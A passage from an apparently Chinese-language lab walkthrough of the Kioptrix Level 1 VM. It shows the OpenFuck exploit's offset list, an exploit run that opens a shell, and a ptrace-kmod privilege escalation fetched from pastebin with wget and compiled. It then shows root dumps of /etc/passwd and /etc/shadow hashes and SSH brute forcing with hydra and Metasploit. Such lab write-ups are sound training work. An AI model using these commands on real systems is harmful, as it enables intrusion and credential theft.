Debian Linux GNU Linux 2 (apache_1.3.24-2.1)</span><br><span class="line">        0x14 - Debian GNU Linux (apache_1.3.24-3)</span><br><span class="line">        0x15 - Debian GNU Linux (apache-1.3.26-1)</span><br><span class="line">        0x16 - Debian GNU Linux 3.0 Woody (apache-1.3.26-1)</span><br><span class="line">        0x17 - Debian GNU Linux (apache-1.3.27)</span><br><span class="line">        0x18 - FreeBSD (apache-1.3.9)</span><br><span class="line">        0x19 - FreeBSD (apache-1.3.11)</span><br><span class="line">        0x1a - FreeBSD (apache-1.3.12.1.40)</span><br><span class="line">        0x1b - FreeBSD (apache-1.3.12.1.40)</span><br><span class="line">        0x1c - FreeBSD (apache-1.3.12.1.40)</span><br><span class="line">        0x1d - FreeBSD (apache-1.3.12.1.40_1)</span><br><span class="line">        0x1e - FreeBSD (apache-1.3.12)</span><br><span class="line">        0x1f - FreeBSD (apache-1.3.14)</span><br><span class="line">        0x20 - FreeBSD (apache-1.3.14)</span><br><span class="line">        0x21 - FreeBSD (apache-1.3.14)</span><br><span class="line">        0x22 - FreeBSD (apache-1.3.14)</span><br><span class="line">        0x23 - FreeBSD (apache-1.3.14)</span><br><span class="line">        0x24 - FreeBSD (apache-1.3.17_1)</span><br><span class="line">        0x25 - FreeBSD (apache-1.3.19)</span><br><span class="line">        0x26 - FreeBSD (apache-1.3.19_1)</span><br><span class="line">        0x27 - FreeBSD (apache-1.3.20)</span><br><span class="line">        0x28 - FreeBSD (apache-1.3.20)</span><br><span class="line">        0x29 - FreeBSD (apache-1.3.20+2.8.4)</span><br><span class="line">        0x2a - FreeBSD (apache-1.3.20_1)</span><br><span class="line">        0x2b - FreeBSD (apache-1.3.22)</span><br><span class="line">        0x2c - FreeBSD (apache-1.3.22_7)</span><br><span class="line">        0x2d - FreeBSD (apache_fp-1.3.23)</span><br><span class="line">        0x2e - FreeBSD (apache-1.3.24_7)</span><br><span class="line">        0x2f - FreeBSD (apache-1.3.24+2.8.8)</span><br><span class="line">        0x30 - FreeBSD 4.6.2-Release-p6 (apache-1.3.26)</span><br><span class="line">        0x31 - FreeBSD 4.6-Realease (apache-1.3.26)</span><br><span class="line">        0x32 - FreeBSD (apache-1.3.27)</span><br><span class="line">        0x33 - Gentoo Linux (apache-1.3.24-r2)</span><br><span class="line">        0x34 - Linux Generic (apache-1.3.14)</span><br><span class="line">        0x35 - Mandrake Linux X.x (apache-1.3.22-10.1mdk)</span><br><span class="line">        0x36 - Mandrake Linux 7.1 (apache-1.3.14-2)</span><br><span class="line">        0x37 - Mandrake Linux 7.1 (apache-1.3.22-1.4mdk)</span><br><span class="line">        0x38 - Mandrake Linux 7.2 (apache-1.3.14-2mdk)</span><br><span class="line">        0x39 - Mandrake Linux 7.2 (apache-1.3.14) 2</span><br><span class="line">        0x3a - Mandrake Linux 7.2 (apache-1.3.20-5.1mdk)</span><br><span class="line">        0x3b - Mandrake Linux 7.2 (apache-1.3.20-5.2mdk)</span><br><span class="line">        0x3c - Mandrake Linux 7.2 (apache-1.3.22-1.3mdk)</span><br><span class="line">        0x3d - Mandrake Linux 7.2 (apache-1.3.22-10.2mdk)</span><br><span class="line">        0x3e - Mandrake Linux 8.0 (apache-1.3.19-3)</span><br><span class="line">        0x3f - Mandrake Linux 8.1 (apache-1.3.20-3)</span><br><span class="line">        0x40 - Mandrake Linux 8.2 (apache-1.3.23-4)</span><br><span class="line">        0x41 - Mandrake Linux 8.2 <span class="comment">#2 (apache-1.3.23-4)</span></span><br><span class="line">        0x42 - Mandrake Linux 8.2 (apache-1.3.24)</span><br><span class="line">        0x43 - Mandrake Linux 9 (apache-1.3.26)</span><br><span class="line">        0x44 - RedHat Linux ?.? GENERIC (apache-1.3.12-1)</span><br><span class="line">        0x45 - RedHat Linux TEST1 (apache-1.3.12-1)</span><br><span class="line">        0x46 - RedHat Linux TEST2 (apache-1.3.12-1)</span><br><span class="line">        0x47 - RedHat Linux GENERIC (marumbi) (apache-1.2.6-5)</span><br><span class="line">        0x48 - RedHat Linux 4.2 (apache-1.1.3-3)</span><br><span class="line">        0x49 - RedHat Linux 5.0 (apache-1.2.4-4)</span><br><span class="line">        0x4a - RedHat Linux 5.1-Update (apache-1.2.6)</span><br><span class="line">        0x4b - RedHat Linux 5.1 (apache-1.2.6-4)</span><br><span class="line">        0x4c - RedHat Linux 5.2 (apache-1.3.3-1)</span><br><span class="line">        0x4d - RedHat Linux 5.2-Update (apache-1.3.14-2.5.x)</span><br><span class="line">        0x4e - RedHat Linux 6.0 (apache-1.3.6-7)</span><br><span class="line">        0x4f - RedHat Linux 6.0 (apache-1.3.6-7)</span><br><span class="line">        0x50 - RedHat Linux 6.0-Update (apache-1.3.14-2.6.2)</span><br><span class="line">        0x51 - RedHat Linux 6.0 Update (apache-1.3.24)</span><br><span class="line">        0x52 - RedHat Linux 6.1 (apache-1.3.9-4)1</span><br><span class="line">        0x53 - RedHat Linux 6.1 (apache-1.3.9-4)2</span><br><span class="line">        0x54 - RedHat Linux 6.1-Update (apache-1.3.14-2.6.2)</span><br><span class="line">        0x55 - RedHat Linux 6.1-fp2000 (apache-1.3.26)</span><br><span class="line">        0x56 - RedHat Linux 6.2 (apache-1.3.12-2)1</span><br><span class="line">        0x57 - RedHat Linux 6.2 (apache-1.3.12-2)2</span><br><span class="line">        0x58 - RedHat Linux 6.2 mod(apache-1.3.12-2)3</span><br><span class="line">        0x59 - RedHat Linux 6.2 update (apache-1.3.22-5.6)1</span><br><span class="line">        0x5a - RedHat Linux 6.2-Update (apache-1.3.22-5.6)2</span><br><span class="line">        0x5b - Redhat Linux 7.x (apache-1.3.22)</span><br><span class="line">        0x5c - RedHat Linux 7.x (apache-1.3.26-1)</span><br><span class="line">        0x5d - RedHat Linux 7.x (apache-1.3.27)</span><br><span class="line">        0x5e - RedHat Linux 7.0 (apache-1.3.12-25)1</span><br><span class="line">        0x5f - RedHat Linux 7.0 (apache-1.3.12-25)2</span><br><span class="line">        0x60 - RedHat Linux 7.0 (apache-1.3.14-2)</span><br><span class="line">        0x61 - RedHat Linux 7.0-Update (apache-1.3.22-5.7.1)</span><br><span class="line">        0x62 - RedHat Linux 7.0-7.1 update (apache-1.3.22-5.7.1)</span><br><span class="line">        0x63 - RedHat Linux 7.0-Update (apache-1.3.27-1.7.1)</span><br><span class="line">        0x64 - RedHat Linux 7.1 (apache-1.3.19-5)1</span><br><span class="line">        0x65 - RedHat Linux 7.1 (apache-1.3.19-5)2</span><br><span class="line">        0x66 - RedHat Linux 7.1-7.0 update (apache-1.3.22-5.7.1)</span><br><span class="line">        0x67 - RedHat Linux 7.1-Update (1.3.22-5.7.1)</span><br><span class="line">        0x68 - RedHat Linux 7.1 (apache-1.3.22-src)</span><br><span class="line">        0x69 - RedHat Linux 7.1-Update (1.3.27-1.7.1)</span><br><span class="line">        0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1</span><br><span class="line">        **0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2**</span><br><span class="line">        0x6c - RedHat Linux 7.2-Update (apache-1.3.22-6)</span><br><span class="line">        0x6d - RedHat Linux 7.2 (apache-1.3.24)</span><br><span class="line">        0x6e - RedHat Linux 7.2 (apache-1.3.26)</span><br><span class="line">        0x6f - RedHat Linux 7.2 (apache-1.3.26-snc)</span><br><span class="line">        0x70 - Redhat Linux 7.2 (apache-1.3.26 w/PHP)1</span><br><span class="line">        0x71 - Redhat Linux 7.2 (apache-1.3.26 w/PHP)2</span><br><span class="line">        0x72 - RedHat Linux 7.2-Update (apache-1.3.27-1.7.2)</span><br><span class="line">        0x73 - RedHat Linux 7.3 (apache-1.3.23-11)1</span><br><span class="line">        0x74 - RedHat Linux 7.3 (apache-1.3.23-11)2</span><br><span class="line">        0x75 - RedHat Linux 7.3 (apache-1.3.27)</span><br><span class="line">        0x76 - RedHat Linux 8.0 (apache-1.3.27)</span><br><span class="line">        0x77 - RedHat Linux 8.0-second (apache-1.3.27)</span><br><span class="line">        0x78 - RedHat Linux 8.0 (apache-2.0.40)</span><br><span class="line">        0x79 - Slackware Linux 4.0 (apache-1.3.6)</span><br><span class="line">        0x7a - Slackware Linux 7.0 (apache-1.3.9)</span><br><span class="line">        0x7b - Slackware Linux 7.0 (apache-1.3.26)</span><br><span class="line">        0x7c - Slackware 7.0  (apache-1.3.26)2</span><br><span class="line">        0x7d - Slackware Linux 7.1 (apache-1.3.12)</span><br><span class="line">        0x7e - Slackware Linux 8.0 (apache-1.3.20)</span><br><span class="line">        0x7f - Slackware Linux 8.1 (apache-1.3.24)</span><br><span class="line">        0x80 - Slackware Linux 8.1 (apache-1.3.26)</span><br><span class="line">        0x81 - Slackware Linux 8.1-stable (apache-1.3.26)</span><br><span class="line">        0x82 - Slackware Linux (apache-1.3.27)</span><br><span class="line">        0x83 - SuSE Linux 7.0 (apache-1.3.12)</span><br><span class="line">        0x84 - SuSE Linux 7.1 (apache-1.3.17)</span><br><span class="line">        0x85 - SuSE Linux 7.2 (apache-1.3.19)</span><br><span class="line">        0x86 - SuSE Linux 7.3 (apache-1.3.20)</span><br><span class="line">        0x87 - SuSE Linux 8.0 (apache-1.3.23)</span><br><span class="line">        0x88 - SUSE Linux 8.0 (apache-1.3.23-120)</span><br><span class="line">        0x89 - SuSE Linux 8.0 (apache-1.3.23-137)</span><br><span class="line">        0x8a - Yellow Dog Linux/PPC 2.3 (apache-1.3.22-6.2.3a)</span><br><span class="line"></span><br><span class="line">Fuck to all guys <span class="built_in">who</span> like use lamah ddos. Read SRC to have no surprise</span><br></pre></td></tr></table></figure>

<ul>
<li>找到了符合版本可以進行利用的offset</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/opt/OpenFuck]</span><br><span class="line">└─# ./OpenFuck 0x6b 192.168.19.140 -c 40     </span><br><span class="line"></span><br><span class="line">*******************************************************************</span><br><span class="line">* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *</span><br><span class="line">*******************************************************************</span><br><span class="line">* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *</span><br><span class="line">* <span class="comment">#hackarena  irc.brasnet.org                                     *</span></span><br><span class="line">* TNX Xanthic USG <span class="comment">#SilverLords #BloodBR #isotk #highsecure #uname *</span></span><br><span class="line">* <span class="comment">#ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *</span></span><br><span class="line">* <span class="comment">#pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *</span></span><br><span class="line">*******************************************************************</span><br><span class="line"></span><br><span class="line">Connection... 40 of 40</span><br><span class="line">Establishing SSL connection</span><br><span class="line">cipher: 0x4043808c   ciphers: 0x80f80e0</span><br><span class="line">Ready to send shellcode</span><br><span class="line">Spawning shell...</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">bash-2.05$ </span><br><span class="line">race-kmod.c; gcc -o p ptrace-kmod.c; <span class="built_in">rm</span> ptrace-kmod.c; ./p; m/raw/C7v25Xr9 -O pt </span><br><span class="line">--04:46:23--  https://pastebin.com/raw/C7v25Xr9</span><br><span class="line">           =&gt; `ptrace-kmod.c<span class="string">&#x27;</span></span><br><span class="line"><span class="string">Connecting to pastebin.com:443... connected!</span></span><br><span class="line"><span class="string">HTTP request sent, awaiting response... 200 OK</span></span><br><span class="line"><span class="string">Length: unspecified [text/plain]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    0K ...                                                    @   3.84 MB/s</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">04:46:24 (3.84 MB/s) - `ptrace-kmod.c&#x27;</span> saved [4026]</span><br><span class="line"></span><br><span class="line">ptrace-kmod.c:183:1: warning: no newline at end of file</span><br><span class="line">[+] Attached to 6630</span><br><span class="line">[+] Waiting <span class="keyword">for</span> signal</span><br><span class="line">[+] Signal caught</span><br><span class="line">[+] Shellcode placed at 0x4001189d</span><br><span class="line">[+] Now <span class="built_in">wait</span> <span class="keyword">for</span> suid shell...</span><br><span class="line"></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">root</span><br><span class="line"></span><br><span class="line">hostname</span><br><span class="line">kioptrix.level1</span><br><span class="line"></span><br><span class="line">locate flag</span><br><span class="line">/usr/sbin/rootflags</span><br><span class="line">/usr/share/doc/db3-devel-3.2.9/api_c/db_set_flags.html</span><br><span class="line">/usr/share/doc/db3-devel-3.2.9/api_c/env_set_flags.html</span><br><span class="line">/usr/share/doc/db3-devel-3.2.9/api_cxx/db_set_flags.html</span><br><span class="line">/usr/share/doc/db3-devel-3.2.9/api_cxx/env_set_flags.html</span><br><span class="line">/usr/share/doc/db3-devel-3.2.9/api_java/db_set_flags.html</span><br><span class="line">/usr/share/doc/db3-devel-3.2.9/api_java/env_set_flags.html</span><br><span class="line">/usr/share/doc/db3-devel-3.2.9/ref/build_unix/flags.html</span><br><span class="line">/usr/share/doc/db3-devel-3.2.9/ref/upgrade.3.2/set_flags.html</span><br><span class="line">/usr/share/man/man3/fegetexceptflag.3.gz</span><br><span class="line">/usr/share/man/man3/fesetexceptflag.3.gz</span><br><span class="line">/usr/share/man/man3/tgetflag.3x.gz</span><br><span class="line">/usr/share/man/man3/tigetflag.3x.gz</span><br><span class="line">/usr/share/man/man8/rootflags.8.gz</span><br><span class="line">/usr/include/bits/waitflags.h</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /usr/sbin/rootflags</span><br><span class="line">ELhP�A�q��.u�V����������P�s������jatus)Z</span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> -l</span><br><span class="line">User root may run the following commands on this host:</span><br><span class="line">    (ALL) ALL</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">bin:x:1:1:bin:/bin:/sbin/nologin</span><br><span class="line">daemon:x:2:2:daemon:/sbin:/sbin/nologin</span><br><span class="line">adm:x:3:4:adm:/var/adm:/sbin/nologin</span><br><span class="line">lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin</span><br><span class="line"><span class="built_in">sync</span>:x:5:0:<span class="built_in">sync</span>:/sbin:/bin/sync</span><br><span class="line">shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown</span><br><span class="line">halt:x:7:0:halt:/sbin:/sbin/halt</span><br><span class="line">mail:x:8:12:mail:/var/spool/mail:/sbin/nologin</span><br><span class="line">news:x:9:13:news:/var/spool/news:</span><br><span class="line">uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin</span><br><span class="line">operator:x:11:0:operator:/root:/sbin/nologin</span><br><span class="line">games:x:12:100:games:/usr/games:/sbin/nologin</span><br><span class="line">gopher:x:13:30:gopher:/var/gopher:/sbin/nologin</span><br><span class="line">ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin</span><br><span class="line">nobody:x:99:99:Nobody:/:/sbin/nologin</span><br><span class="line">mailnull:x:47:47::/var/spool/mqueue:/dev/null</span><br><span class="line">rpm:x:37:37::/var/lib/rpm:/bin/bash</span><br><span class="line">xfs:x:43:43:X Font Server:/etc/X11/fs:/bin/false</span><br><span class="line">rpc:x:32:32:Portmapper RPC user:/:/bin/false</span><br><span class="line">rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin</span><br><span class="line">nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin</span><br><span class="line">nscd:x:28:28:NSCD Daemon:/:/bin/false</span><br><span class="line">ident:x:98:98:pident user:/:/sbin/nolcat /etc/passwd</span><br><span class="line">ogin</span><br><span class="line">radvd:x:75:75:radvd user:/:/bin/false</span><br><span class="line">postgres:x:26:26:PostgreSQL Server:/var/lib/pgsql:/bin/bash</span><br><span class="line">apache:x:48:48:Apache:/var/www:/bin/false</span><br><span class="line">squid:x:23:23::/var/spool/squid:/dev/null</span><br><span class="line">pcap:x:77:77::/var/arpwatch:/bin/nologin</span><br><span class="line">john:x:500:500::/home/john:/bin/bash</span><br><span class="line">harold:x:501:501::/home/harold:/bin/bash</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /etc/shadow</span><br><span class="line">root:$1$XROmcfDX<span class="variable">$tF93GqnLHOJeGRHpaNyIs0</span>:14513:0:99999:7:::</span><br><span class="line">bin:*:14513:0:99999:7:::</span><br><span class="line">daemon:*:14513:0:99999:7:::</span><br><span class="line">adm:*:14513:0:99999:7:::</span><br><span class="line">lp:*:14513:0:99999:7:::</span><br><span class="line"><span class="built_in">sync</span>:*:14513:0:99999:7:::</span><br><span class="line">shutdown:*:14513:0:99999:7:::</span><br><span class="line">halt:*:14513:0:99999:7:::</span><br><span class="line">mail:*:14513:0:99999:7:::</span><br><span class="line">news:*:14513:0:99999:7:::</span><br><span class="line">uucp:*:14513:0:99999:7:::</span><br><span class="line">operator:*:14513:0:99999:7:::</span><br><span class="line">games:*:14513:0:99999:7:::</span><br><span class="line">gopher:*:14513:0:99999:7:::</span><br><span class="line">ftp:*:14513:0:99999:7:::</span><br><span class="line">nobody:*:14513:0:99999:7:::</span><br><span class="line">mailnull:!!:14513:0:99999:7:::</span><br><span class="line">rpm:!!:14513:0:99999:7:::</span><br><span class="line">xfs:!!:14513:0:99999:7:::</span><br><span class="line">rpc:!!:14513:0:99999:7:::</span><br><span class="line">rpcuser:!!:14513:0:99999:7:::</span><br><span class="line">nfsnobody:!!:14513:0:99999:7:::</span><br><span class="line">nscd:!!:14513:0:99999:7:::</span><br><span class="line">ident:!!:14513:0:99999:7:::</span><br><span class="line">radvd:!!:14513:0:99999:7:::</span><br><span class="line">postgres:!!:14513:0:99999:7:::</span><br><span class="line">apache:!!:14513:0:99999:7:::</span><br><span class="line">squid:!!:14513:0:99999:7:::</span><br><span class="line">pcap:!!:14513:0:99999:7:::</span><br><span class="line">john:$1<span class="variable">$zL4</span>.MR4t<span class="variable">$26N4YpTGceBO0gTX6TAky1</span>:14513:0:99999:7:::</span><br><span class="line">harold:$1$Xx6dZdOd<span class="variable">$IMOGACl3r757dv17LZ9010</span>:14513:0:99999:7:::</span><br></pre></td></tr></table></figure>

<ul>
<li>通過root身分可以看到不少機敏資訊</li>
</ul>
<h3 id="Brute-Force-Attacks"><a href="#Brute-Force-Attacks" class="headerlink" title="Brute Force Attacks"></a><strong>Brute Force Attacks</strong></h3><p>從現實角度出發</p>
<ul>
<li><p>評估中看到SSH，嘗試對其進行暴力破解，或默認憑據</p>
<ul>
<li>測試密碼強度</li>
<li>弱密碼、默認密碼</li>
</ul>
</li>
<li><p>確認藍隊的表現</p>
<ul>
<li>評估對方是否能偵測到攻擊</li>
<li>攻擊是否有告警</li>
</ul>
</li>
<li><p>hydra - SSH 錯誤</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.19.140:22 -t 4 -V**</span><br><span class="line">Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please <span class="keyword">do</span> not use <span class="keyword">in</span> military or secret service organizations, or <span class="keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-02-14 16:23:58</span><br><span class="line">[DATA] max 4 tasks per 1 server, overall 4 tasks, 1009 login tries (l:1/p:1009), ~253 tries per task</span><br><span class="line">[DATA] attacking ssh://192.168.19.140:22/</span><br><span class="line">[ERROR] could not connect to ssh://192.168.19.140:22 - kex error : no match <span class="keyword">for</span> method server host key algo: server [ssh-rsa,ssh-dss], client [ssh-ed25519,ecdsa-sha2-nistp521,ecdsa-sha2-nistp384,ecdsa-sha2-nistp256,sk-ssh-ed25519@openssh.com,sk-ecdsa-sha2-nistp256@openssh.com,rsa-sha2-512,rsa-sha2-256]</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# apt update&amp;&amp; apt full-upgrade -y</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# dpkg -l | grep kali-tweaks</span><br><span class="line">ii  kali-tweaks                                    2023.3.2                                all          tool to adjust advanced configuration settings <span class="keyword">for</span> Kali Linux</span><br><span class="line">                                                                                                                                       </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# kali-tweaks  </span><br><span class="line">&gt;&gt;&gt; Configuring Samba</span><br><span class="line">&gt; Setting client min protocol to: LANMAN1</span><br><span class="line">&gt; Writing changes to /etc/samba/smb.conf</span><br><span class="line">&gt;&gt;&gt; Configuring SSH</span><br><span class="line">&gt; Enabling wide compatibility</span><br><span class="line">&gt; $ <span class="built_in">cp</span> -f /usr/share/kali-defaults/etc/ssh/ssh_config.d/kali-wide-compat.conf /etc/ssh/ssh_config.d/kali-wide-compat.conf</span><br><span class="line"></span><br><span class="line">┏━(Message from Kali developers)</span><br><span class="line">┃ For more information about Samba configuration, please refer to:</span><br><span class="line">┃ https://www.kali.org/docs/general-use/samba-configuration/</span><br><span class="line">┃ For more information about SSH configuration, please refer to:</span><br><span class="line">┃ https://www.kali.org/docs/general-use/ssh-configuration/</span><br><span class="line">┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span><br><span class="line"></span><br><span class="line">&gt; Press Enter to <span class="built_in">continue</span>...</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>  enter &gt; 選SSH client &gt; OK</p>
<p>  <img src="/img/exploit_Untitled_4.png" alt="Untitled"></p>
<p>  會需要再輸入一次</p>
<p>  <img src="/img/exploit_Untitled_5.png" alt="Untitled"></p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.19.140:22 -t 4 -V</span><br></pre></td></tr></table></figure>

<p>同時開啟MSF，選擇需要的模塊並將選項中的參數填入，執行程式</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Metasploit Documentation: https://docs.metasploit.com/</span><br><span class="line"></span><br><span class="line">msf6 &gt; **search ssh**</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   <span class="comment">#   Name                                                              Disclosure Date  Rank       Check  Description</span></span><br><span class="line">   -   ----                                                              ---------------  ----       -----  -----------</span><br><span class="line">   0   exploit/linux/http/alienvault_exec                                2017-01-31       excellent  Yes    AlienVault OSSIM/USM Remote Code Execution</span><br><span class="line">   1   auxiliary/scanner/ssh/apache_karaf_command_execution              2016-02-09       normal     No     Apache Karaf Default Credentials Command Execution</span><br><span class="line">   2   auxiliary/scanner/ssh/karaf_login                                                  normal     No     Apache Karaf Login Utility</span><br><span class="line">   3   exploit/apple_ios/ssh/cydia_default_ssh                           2007-07-02       excellent  No     Apple iOS Default SSH Password Vulnerability                                                                                                    </span><br><span class="line">   4   exploit/unix/ssh/arista_tacplus_shell                             2020-02-02       great      Yes    Arista restricted shell escape (with privesc)</span><br><span class="line">   5   exploit/unix/ssh/array_vxag_vapv_privkey_privesc                  2014-02-03       excellent  No     Array Networks vAPV and vxAG Private Key Privilege Escalation Code Execution</span><br><span class="line">   6   exploit/linux/ssh/ceragon_fibeair_known_privkey                   2015-04-01       excellent  No     Ceragon FibeAir IP-10 SSH Private Key Exposure</span><br><span class="line">   7   auxiliary/scanner/ssh/cerberus_sftp_enumusers                     2014-05-27       normal     No     Cerberus FTP Server SFTP Username Enumeration</span><br><span class="line">....</span><br><span class="line">   43  exploit/linux/ssh/quantum_dxi_known_privkey                       2014-03-17       excellent  No     Quantum DXi V1000 SSH Private Key Exposure                                                                                                      </span><br><span class="line">   44  exploit/linux/ssh/quantum_vmpro_backdoor                          2014-03-17       excellent  No     Quantum vmPRO Backdoor Command</span><br><span class="line">   45  auxiliary/fuzzers/ssh/ssh_version_15                                               normal     No     SSH 1.5 Version Fuzzer</span><br><span class="line">   46  auxiliary/fuzzers/ssh/ssh_version_2                                                normal     No     SSH 2.0 Version Fuzzer</span><br><span class="line">   47  auxiliary/fuzzers/ssh/ssh_kexinit_corrupt                                          normal     No     SSH Key Exchange Init Corruption</span><br><span class="line">   48  post/linux/manage/sshkey_persistence                                               excellent  No     SSH Key Persistence</span><br><span class="line">   49  post/windows/manage/sshkey_persistence                                             good       No     SSH Key Persistence</span><br><span class="line">   **50  auxiliary/scanner/ssh/ssh_login                                                    normal     No     SSH Login Check Scanner**</span><br><span class="line">   51  auxiliary/scanner/ssh/ssh_identify_pubkeys                                         normal     No     SSH Public Key Acceptance Scanner</span><br><span class="line">   52  auxiliary/scanner/ssh/ssh_login_pubkey                                             normal     No     SSH Public Key Login Scanner</span><br><span class="line">   53  exploit/multi/ssh/sshexec                                         1999-01-01       manual     No     SSH User Code Execution</span><br><span class="line">   54  auxiliary/scanner/ssh/ssh_enumusers                                                normal     No     SSH Username Enumeration</span><br><span class="line">   55  auxiliary/fuzzers/ssh/ssh_version_corrupt                                          normal     No     SSH Version Corruption</span><br><span class="line">   56  auxiliary/scanner/ssh/ssh_version                                                  normal     No     SSH Version Scanner</span><br><span class="line">.....</span><br><span class="line">   70  payload/cmd/unix/bind_aws_instance_connect                                         normal     No     Unix SSH Shell, Bind Instance Connect (via AWS API)</span><br><span class="line">   71  exploit/linux/ssh/vmware_vrni_known_privkey                       2023-08-29       excellent  No     VMWare Aria Operations <span class="keyword">for</span> Networks (vRealize Network Insight) SSH Private Key Exposure</span><br><span class="line">   72  exploit/linux/ssh/vmware_vdp_known_privkey                        2016-12-20       excellent  No     VMware VDP Known SSH Key                                                                                                                        </span><br><span class="line">   73  exploit/multi/http/vmware_vcenter_uploadova_rce                   2021-02-23       manual     Yes    VMware vCenter Server Unauthenticated OVA File Upload RCE</span><br><span class="line">   74  exploit/linux/ssh/vyos_restricted_shell_privesc                   2018-11-05       great      Yes    VyOS restricted-shell Escape and Privilege Escalation</span><br><span class="line">   75  post/windows/gather/credentials/whatsupgold_credential_dump       2022-11-22       manual     No     WhatsUp Gold Credentials Dump</span><br><span class="line">   76  post/windows/gather/credentials/mremote                                            normal     No     Windows Gather mRemote Saved Password Extraction</span><br><span class="line">   77  exploit/windows/local/unquoted_service_path                       2001-10-25       great      Yes    Windows Unquoted Service Path Privilege Escalation</span><br><span class="line">   78  exploit/linux/http/zyxel_lfi_unauth_ssh_rce                       2022-02-01       excellent  Yes    Zyxel chained RCE using LFI and weak password derivation algorithm</span><br><span class="line">   79  auxiliary/scanner/ssh/libssh_auth_bypass                          2018-10-16       normal     No     libssh Authentication Bypass Scanner</span><br><span class="line">   80  exploit/linux/http/php_imap_open_rce                              2018-10-23       good       Yes    php imap_open Remote Code Execution</span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 80, use 80 or use exploit/linux/http/php_imap_open_rce</span><br><span class="line"></span><br><span class="line">msf6 &gt; use 50</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/ssh/ssh_login):</span><br><span class="line"></span><br><span class="line">   Name              Current Setting  Required  Description</span><br><span class="line">   ----              ---------------  --------  -----------</span><br><span class="line">   ANONYMOUS_LOGIN   <span class="literal">false</span>            <span class="built_in">yes</span>       Attempt to login with a blank username and password</span><br><span class="line">   BLANK_PASSWORDS   <span class="literal">false</span>            no        Try blank passwords <span class="keyword">for</span> all <span class="built_in">users</span></span><br><span class="line">   BRUTEFORCE_SPEED  5                <span class="built_in">yes</span>       How fast to bruteforce, from 0 to 5</span><br><span class="line">   DB_ALL_CREDS      <span class="literal">false</span>            no        Try each user/password couple stored <span class="keyword">in</span> the current database</span><br><span class="line">   DB_ALL_PASS       <span class="literal">false</span>            no        Add all passwords <span class="keyword">in</span> the current database to the list</span><br><span class="line">   DB_ALL_USERS      <span class="literal">false</span>            no        Add all <span class="built_in">users</span> <span class="keyword">in</span> the current database to the list</span><br><span class="line">   DB_SKIP_EXISTING  none             no        Skip existing credentials stored <span class="keyword">in</span> the current database (Accepted: none, us</span><br><span class="line">                                                er, user&amp;realm)</span><br><span class="line">   PASSWORD                           no        A specific password to authenticate with</span><br><span class="line">   PASS_FILE                          no        File containing passwords, one per line</span><br><span class="line">   RHOSTS                             <span class="built_in">yes</span>       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/ba</span><br><span class="line">                                                sics/using-metasploit.html</span><br><span class="line">   RPORT             22               <span class="built_in">yes</span>       The target port</span><br><span class="line">   STOP_ON_SUCCESS   <span class="literal">false</span>            <span class="built_in">yes</span>       Stop guessing when a credential works <span class="keyword">for</span> a host</span><br><span class="line">   THREADS           1                <span class="built_in">yes</span>       The number of concurrent threads (max one per host)</span><br><span class="line">   USERNAME                           no        A specific username to authenticate as</span><br><span class="line">   USERPASS_FILE                      no        File containing <span class="built_in">users</span> and passwords separated by space, one pair per line</span><br><span class="line">   USER_AS_PASS      <span class="literal">false</span>            no        Try the username as the password <span class="keyword">for</span> all <span class="built_in">users</span></span><br><span class="line">   USER_FILE                          no        File containing usernames, one per line</span><br><span class="line">   VERBOSE           <span class="literal">false</span>            <span class="built_in">yes</span>       Whether to <span class="built_in">print</span> output <span class="keyword">for</span> all attempts</span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d <span class="built_in">command</span>.</span><br><span class="line"></span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; <span class="built_in">set</span> username root</span><br><span class="line">username =&gt; root</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; <span class="built_in">set</span> pass_file 